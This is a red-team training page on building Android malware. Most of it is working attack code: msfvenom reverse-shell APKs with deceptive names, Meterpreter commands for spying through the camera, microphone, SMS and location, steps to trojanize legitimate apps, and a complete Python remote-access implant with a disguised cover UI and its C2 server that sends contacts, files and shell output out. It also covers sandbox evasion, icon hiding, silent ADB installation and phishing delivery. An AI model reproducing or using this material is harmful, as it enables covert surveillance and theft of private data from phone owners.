---
layout: training-page
title: "Android Payload Development — Red Team Academy"
module: "Mobile Security"
tags:
  - android
  - payload
  - msfvenom
  - apk
  - rat
  - trojan
page_key: "mobile-android-payload-dev"
---
<h1>Android Payload Development</h1>
<p>Building custom Android payloads for red team engagements — from quick msfvenom APKs to trojanized legitimate apps and fully custom implants. The goal is establishing a foothold on a target's Android device through social engineering or physical access.</p>

<h2>msfvenom Android Payloads</h2>
<h3>Basic Reverse Shell APK</h3>
<pre><code># Generate a standalone malicious APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 \
    -o payload.apk

# Generate with a custom app name (social engineering)
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 \
    -o WiFi_Optimizer.apk

# HTTPS payload (encrypted C2 channel)
msfvenom -p android/meterpreter/reverse_https \
    LHOST=10.10.14.5 LPORT=8443 \
    -o payload_https.apk

# Start handler
msfconsole -q -x "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j
"</code></pre>

<h3>Meterpreter Post-Exploitation on Android</h3>
<pre><code># Once session established:
sessions -i 1

# Device information
sysinfo
getuid

# Location tracking
geolocate

# Camera
webcam_snap -i 1        # front camera
webcam_snap -i 2        # rear camera
webcam_stream            # live stream

# Audio
record_mic -d 30         # record 30 seconds of audio

# SMS and calls
dump_sms
dump_calllog
dump_contacts

# File system
pwd
ls /sdcard/
download /sdcard/DCIM/Camera/
upload local_file.txt /sdcard/

# Network
ifconfig
route

# App list
app_list
app_run com.android.settings

# Persistence
run post/android/manage/autostart</code></pre>

<h2>Trojanizing Legitimate APKs</h2>
<h3>Manual Injection with apktool</h3>
<pre><code># Step 1: Decompile the legitimate APK
apktool d legitimate.apk -o legit_decoded/

# Step 2: Generate payload smali
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 \
    -o payload.apk
apktool d payload.apk -o payload_decoded/

# Step 3: Copy payload smali into legitimate app
cp -r payload_decoded/smali/com/metasploit/ legit_decoded/smali/com/

# Step 4: Find the main activity's onCreate in legit_decoded
grep -r "onCreate" legit_decoded/smali/ | head -5

# Step 5: Add payload invocation to onCreate
# Insert this line after the first .locals directive in onCreate:
# invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V

# Step 6: Merge permissions from payload manifest into legit manifest
# Add any missing permissions (INTERNET, ACCESS_FINE_LOCATION, etc.)

# Step 7: Rebuild
apktool b legit_decoded/ -o trojanized.apk

# Step 8: Sign the APK (required for Android to install it)
keytool -genkey -v -keystore custom.keystore -alias mykey \
    -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass password -keypass password \
    -dname "CN=Android Debug,O=Android,C=US"

jarsigner -verbose -keystore custom.keystore \
    -storepass password -keypass password \
    trojanized.apk mykey

# Step 9: Align
zipalign -v 4 trojanized.apk trojanized_aligned.apk</code></pre>

<h3>Automated Injection with fatrat</h3>
<pre><code># TheFatRat — automated backdoor injection
# github.com/Screetsec/TheFatRat

git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh

# Run fatrat
fatrat

# Select: [5] Backdoor Android APK (Original)
# Provide: LHOST, LPORT, target APK
# Output: trojanized APK with payload embedded</code></pre>

<h2>Custom Android RAT (Python + Buildozer)</h2>
<h3>Architecture</h3>
<pre><code># Build a custom Android implant using Python + Kivy + Buildozer
# Compiles Python to APK via Buildozer (uses python-for-android)
# Advantages: easily extensible, no msfvenom signatures, custom C2 protocol

# Project structure:
# android-rat/
# ├── main.py           # implant logic
# ├── buildozer.spec    # build configuration
# └── c2_server.py      # C2 server (runs on attacker machine)</code></pre>

<h3>Implant Code (main.py)</h3>
<pre><code># Minimal Android implant — connects back to C2, executes commands
# Uses Android APIs via pyjnius (Java bridge)

import socket
import subprocess
import os
import json
import time
import threading
from base64 import b64encode, b64decode

C2_HOST = "10.10.14.5"
C2_PORT = 9999
BEACON_INTERVAL = 30

def get_device_info():
    """Gather basic device information."""
    from jnius import autoclass
    Build = autoclass("android.os.Build")
    return {
        "model": Build.MODEL,
        "manufacturer": Build.MANUFACTURER,
        "version": Build.VERSION.RELEASE,
        "sdk": Build.VERSION.SDK_INT,
        "device": Build.DEVICE
    }

def execute_cmd(cmd):
    """Execute shell command and return output."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def exfil_file(path):
    """Read a file and return base64-encoded contents."""
    try:
        with open(path, "rb") as f:
            return b64encode(f.read()).decode()
    except Exception as e:
        return f"ERROR: {e}"

def get_contacts():
    """Read device contacts via Android content resolver."""
    try:
        from jnius import autoclass, cast
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        context = cast("android.content.Context", PythonActivity.mActivity)
        resolver = context.getContentResolver()
        ContactsContract = autoclass(
            "android.provider.ContactsContract$CommonDataKinds$Phone"
        )
        cursor = resolver.query(
            ContactsContract.CONTENT_URI, None, None, None, None
        )
        contacts = []
        while cursor.moveToNext():
            name = cursor.getString(
                cursor.getColumnIndex(ContactsContract.DISPLAY_NAME)
            )
            number = cursor.getString(
                cursor.getColumnIndex(ContactsContract.NUMBER)
            )
            contacts.append({"name": name, "number": number})
        cursor.close()
        return json.dumps(contacts)
    except Exception as e:
        return f"ERROR: {e}"

def beacon():
    """Main C2 communication loop."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((C2_HOST, C2_PORT))
            # Send checkin with device info
            sock.send(json.dumps({
                "type": "checkin",
                "info": get_device_info()
            }).encode() + b"\n")

            while True:
                data = sock.recv(4096).decode().strip()
                if not data:
                    break
                cmd = json.loads(data)
                if cmd["action"] == "shell":
                    result = execute_cmd(cmd["command"])
                elif cmd["action"] == "exfil":
                    result = exfil_file(cmd["path"])
                elif cmd["action"] == "contacts":
                    result = get_contacts()
                elif cmd["action"] == "sleep":
                    global BEACON_INTERVAL
                    BEACON_INTERVAL = int(cmd["seconds"])
                    result = f"Sleep set to {BEACON_INTERVAL}s"
                else:
                    result = "Unknown command"
                sock.send(json.dumps({
                    "type": "response",
                    "data": result
                }).encode() + b"\n")
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
        time.sleep(BEACON_INTERVAL)

# Entry point — start beacon in background thread
if __name__ == "__main__":
    t = threading.Thread(target=beacon, daemon=True)
    t.start()
    # Show a legitimate-looking UI to avoid suspicion
    from kivy.app import App
    from kivy.uix.label import Label
    class CoverApp(App):
        def build(self):
            return Label(text="System Optimizer\nRunning...")
    CoverApp().run()</code></pre>

<h3>C2 Server</h3>
<pre><code># Simple C2 server — receives beacons, sends commands
import socket
import json
import threading

HOST = "0.0.0.0"
PORT = 9999
sessions = {}

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        data = conn.recv(4096).decode().strip()
        checkin = json.loads(data)
        session_id = f"{addr[0]}:{addr[1]}"
        sessions[session_id] = {
            "conn": conn,
            "info": checkin.get("info", {}),
            "addr": addr
        }
        print(f"[+] Device: {checkin.get('info', {}).get('model', 'unknown')}")

        while True:
            cmd_input = input(f"({session_id})&gt; ").strip()
            if not cmd_input:
                continue
            if cmd_input.startswith("shell "):
                payload = {"action": "shell", "command": cmd_input[6:]}
            elif cmd_input.startswith("exfil "):
                payload = {"action": "exfil", "path": cmd_input[6:]}
            elif cmd_input == "contacts":
                payload = {"action": "contacts"}
            elif cmd_input.startswith("sleep "):
                payload = {"action": "sleep", "seconds": cmd_input[6:]}
            else:
                print("Commands: shell &lt;cmd&gt; | exfil &lt;path&gt; | contacts | sleep &lt;sec&gt;")
                continue
            conn.send(json.dumps(payload).encode() + b"\n")
            response = conn.recv(65536).decode().strip()
            resp = json.loads(response)
            print(resp.get("data", "No data"))
    except Exception as e:
        print(f"[-] Session closed: {e}")
    finally:
        conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] C2 listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == "__main__":
    main()</code></pre>

<h3>Building the APK</h3>
<pre><code># Install buildozer
pip install buildozer cython

# Initialize project
cd android-rat/
buildozer init

# Edit buildozer.spec — key settings:
# title = System Optimizer
# package.name = sysoptimizer
# package.domain = com.android
# source.include_exts = py,png,jpg,kv,atlas
# requirements = python3,kivy,pyjnius
# android.permissions = INTERNET,READ_CONTACTS,ACCESS_FINE_LOCATION,
#     CAMERA,RECORD_AUDIO,READ_SMS,READ_EXTERNAL_STORAGE,
#     WRITE_EXTERNAL_STORAGE,READ_CALL_LOG,RECEIVE_BOOT_COMPLETED
# android.api = 33
# android.minapi = 21

# Build debug APK
buildozer android debug

# Output: bin/sysoptimizer-0.1-arm64-v8a-debug.apk</code></pre>

<h2>Signing &amp; Distribution</h2>
<pre><code># Generate a release keystore
keytool -genkey -v -keystore release.keystore -alias app \
    -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass changeit -keypass changeit \
    -dname "CN=Company App,O=Company Inc,C=US"

# Sign APK
apksigner sign --ks release.keystore --ks-pass pass:changeit \
    --key-pass pass:changeit --out signed.apk unsigned.apk

# Verify signature
apksigner verify --verbose signed.apk

# Delivery methods for red team engagement:
# 1. Phishing email with APK attached (or link to download)
# 2. Fake app store / cloned website
# 3. QR code on physical flyer pointing to download URL
# 4. USB drop with APK (auto-install via ADB if device unlocked)
# 5. Watering hole — compromise a site the target visits</code></pre>

<h2>Evasion Techniques for Android Payloads</h2>
<pre><code># 1. Obfuscate with ProGuard/R8 (in build.gradle)
# buildTypes { release { minifyEnabled true } }

# 2. String encryption — avoid plaintext C2 addresses
# Encrypt C2 URL and decrypt at runtime
import base64
C2_ENCODED = "MTAuMTAuMTQuNQ=="  # base64 of "10.10.14.5"
C2_HOST = base64.b64decode(C2_ENCODED).decode()

# 3. Delayed execution — sleep before connecting to C2
# Evades sandbox analysis that runs for limited time
import time
time.sleep(120)  # 2 minute delay before first beacon

# 4. Emulator detection — refuse to run in analysis sandboxes
from jnius import autoclass
Build = autoclass("android.os.Build")
if "generic" in Build.FINGERPRINT or "sdk" in Build.PRODUCT:
    sys.exit(0)  # kill if running in emulator

# 5. Network check — only beacon on Wi-Fi (avoid mobile data charges / suspicion)
# Check connectivity before connecting

# 6. Icon hiding — remove app from launcher after first run
# Disable launcher activity component programmatically

# 7. Certificate pinning on C2 channel
# Pin your C2 server's cert to prevent interception</code></pre>

<h2>ADB-Based Payload Deployment</h2>
<pre><code># When you have physical access or ADB over network:

# Install silently (device must be unlocked with USB debugging on)
adb install -r payload.apk

# Launch the payload
adb shell am start -n com.android.sysoptimizer/.MainActivity

# Grant all permissions automatically
adb shell pm grant com.android.sysoptimizer android.permission.READ_CONTACTS
adb shell pm grant com.android.sysoptimizer android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.android.sysoptimizer android.permission.CAMERA
adb shell pm grant com.android.sysoptimizer android.permission.RECORD_AUDIO
adb shell pm grant com.android.sysoptimizer android.permission.READ_SMS

# Hide from launcher (requires root)
adb shell pm disable com.android.sysoptimizer/.MainActivity
# App still runs as service but has no launcher icon

# ADB over Wi-Fi (persistent access)
adb tcpip 5555
adb connect 192.168.1.100:5555
# Now connect without USB cable</code></pre>

<h2>Resources</h2>
<ul>
  <li>msfvenom Android payloads — <code>docs.metasploit.com</code></li>
  <li>Buildozer — <code>github.com/kivy/buildozer</code></li>
  <li>TheFatRat — <code>github.com/Screetsec/TheFatRat</code></li>
  <li>apksigner — <code>developer.android.com/studio/command-line/apksigner</code></li>
  <li>OWASP MASTG — <code>mas.owasp.org/MASTG/</code></li>
  <li>Android App Reverse Engineering — <code>github.com/pxb1988/dex2jar</code></li>
</ul>
